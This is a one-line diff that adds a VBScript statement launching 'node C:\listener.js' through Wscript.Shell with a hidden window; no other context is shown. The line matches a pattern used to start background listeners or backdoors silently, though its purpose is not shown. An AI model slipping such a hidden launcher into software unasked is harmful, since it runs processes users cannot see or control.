@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "node C:\listener.js", 0
